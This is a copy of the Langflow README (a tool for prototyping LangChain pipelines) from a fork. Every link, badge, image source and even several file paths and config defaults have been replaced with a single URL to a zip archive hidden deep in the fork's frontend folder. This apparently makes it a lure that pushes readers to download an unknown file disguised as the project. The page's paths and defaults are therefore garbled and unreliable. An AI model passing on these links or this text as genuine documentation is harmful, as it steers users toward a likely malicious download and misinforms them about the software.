<!-- Title -->

# ⛓️ Langflow

~ An effortless way to experiment and prototype [LangChain](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) pipelines ~

<p>
<img alt="GitHub Contributors" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
<img alt="GitHub Last Commit" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
<img alt="" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
<img alt="GitHub Issues" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
<img alt="GitHub Pull Requests" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
<img alt="Github License" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
</p>

<p>
<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"><img alt="Discord Server" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"/></a>
<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"><img src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" alt="HuggingFace Spaces"></a>
</p>

<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip">
    <img width="100%" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"></a>

<p>
</p>

# Table of Contents

- [⛓️ Langflow](#️-langflow)
- [Table of Contents](#table-of-contents)
- [📦 Installation](#-installation)
  - [Locally](#locally)
  - [HuggingFace Spaces](#huggingface-spaces)
- [🖥️ Command Line Interface (CLI)](#️-command-line-interface-cli)
  - [Usage](#usage)
    - [Environment Variables](#environment-variables)
- [Deployment](#deployment)
  - [Deploy Langflow on Google Cloud Platform](#deploy-langflow-on-google-cloud-platform)
  - [Deploy on Railway](#deploy-on-railway)
  - [Deploy on Render](#deploy-on-render)
- [🎨 Creating Flows](#-creating-flows)
- [👋 Contributing](#-contributing)
- [📄 License](#-license)

# 📦 Installation

### <b>Locally</b>

You can install Langflow from pip:

```shell
# This installs the package without dependencies for local models
pip install langflow
```

To use local models (e.g llama-cpp-python) run:

```shell
pip install langflow[local]
```

This will install the following dependencies:

- [CTransformers](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
- [llama-cpp-python](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
- [sentence-transformers](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)

You can still use models from projects like LocalAI

Next, run:

```shell
python -m langflow
```

or

```shell
langflow run # or langflow --help
```

### HuggingFace Spaces

You can also check it out on [HuggingFace Spaces](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) and run it in your browser! You can even clone it and have your own copy of Langflow to play with.

# 🖥️ Command Line Interface (CLI)

Langflow provides a command-line interface (CLI) for easy management and configuration.

## Usage

You can run the Langflow using the following command:

```shell
langflow run [OPTIONS]
```

Each option is detailed below:

- `--help`: Displays all available options.
- `--host`: Defines the host to bind the server to. Can be set using the `LANGFLOW_HOST` environment variable. The default is `127.0.0.1`.
- `--workers`: Sets the number of worker processes. Can be set using the `LANGFLOW_WORKERS` environment variable. The default is `1`.
- `--timeout`: Sets the worker timeout in seconds. The default is `60`.
- `--port`: Sets the port to listen on. Can be set using the `LANGFLOW_PORT` environment variable. The default is `7860`.
- `--config`: Defines the path to the configuration file. The default is `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip`.
- `--env-file`: Specifies the path to the .env file containing environment variables. The default is `.env`.
- `--log-level`: Defines the logging level. Can be set using the `LANGFLOW_LOG_LEVEL` environment variable. The default is `critical`.
- `--components-path`: Specifies the path to the directory containing custom components. Can be set using the `LANGFLOW_COMPONENTS_PATH` environment variable. The default is `langflow/components`.
- `--log-file`: Specifies the path to the log file. Can be set using the `LANGFLOW_LOG_FILE` environment variable. The default is `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip`.
- `--cache`: Selects the type of cache to use. Options are `InMemoryCache` and `SQLiteCache`. Can be set using the `LANGFLOW_LANGCHAIN_CACHE` environment variable. The default is `SQLiteCache`.
- `--dev/--no-dev`: Toggles the development mode. The default is `no-dev`.
- `--path`: Specifies the path to the frontend directory containing build files. This option is for development purposes only. Can be set using the `LANGFLOW_FRONTEND_PATH` environment variable.
- `--open-browser/--no-open-browser`: Toggles the option to open the browser after starting the server. Can be set using the `LANGFLOW_OPEN_BROWSER` environment variable. The default is `open-browser`.
- `--remove-api-keys/--no-remove-api-keys`: Toggles the option to remove API keys from the projects saved in the database. Can be set using the `LANGFLOW_REMOVE_API_KEYS` environment variable. The default is `no-remove-api-keys`.
- `--install-completion [bash|zsh|fish|powershell|pwsh]`: Installs completion for the specified shell.
- `--show-completion [bash|zsh|fish|powershell|pwsh]`: Shows completion for the specified shell, allowing you to copy it or customize the installation.
- `--backend-only`: This parameter, with a default value of `False`, allows running only the backend server without the frontend. It can also be set using the `LANGFLOW_BACKEND_ONLY` environment variable.
- `--store`: This parameter, with a default value of `True`, enables the store features, use `--no-store` to deactivate it. It can be configured using the `LANGFLOW_STORE` environment variable.

These parameters are important for users who need to customize the behavior of Langflow, especially in development or specialized deployment scenarios. You may want to update the documentation to include these parameters for completeness and clarity.

### Environment Variables

You can configure many of the CLI options using environment variables. These can be exported in your operating system or added to a `.env` file and loaded using the `--env-file` option.

A sample `.env` file named `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip` is included with the project. Copy this file to a new file named `.env` and replace the example values with your actual settings. If you're setting values in both your OS and the `.env` file, the `.env` settings will take precedence.

# Deployment

## Deploy Langflow on Google Cloud Platform

Follow our step-by-step guide to deploy Langflow on Google Cloud Platform (GCP) using Google Cloud Shell. The guide is available in the [**Langflow in Google Cloud Platform**](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) document.

Alternatively, click the **"Open in Cloud Shell"** button below to launch Google Cloud Shell, clone the Langflow repository, and start an **interactive tutorial** that will guide you through the process of setting up the necessary resources and deploying Langflow on your GCP project.

[![Open in Cloud Shell](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)

## Deploy on Railway

[![Deploy on Railway](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)

## Deploy on Render

<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip">
<img src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" alt="Deploy to Render" />
</a>

# 🎨 Creating Flows

Creating flows with Langflow is easy. Simply drag sidebar components onto the canvas and connect them together to create your pipeline. Langflow provides a range of [LangChain components](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) to choose from, including LLMs, prompt serializers, agents, and chains.

Explore by editing prompt parameters, link chains and agents, track an agent's thought process, and export your flow.

Once you're done, you can export your flow as a JSON file to use with LangChain.
To do so, click the "Export" button in the top right corner of the canvas, then
in Python, you can load the flow with:

```python
from langflow import load_flow_from_json

flow = load_flow_from_json("https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip")
# Now you can use it like any chain
flow("Hey, have you heard of Langflow?")
```

# 👋 Contributing

We welcome contributions from developers of all levels to our open-source project on GitHub. If you'd like to contribute, please check our [contributing guidelines](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) and help make Langflow more accessible.

---

Join our [Discord](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) server to ask questions, make suggestions and showcase your projects! 🦾

<p>
</p>

[![Star History Chart](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)

# 📄 License

Langflow is released under the MIT License. See the LICENSE file for details.
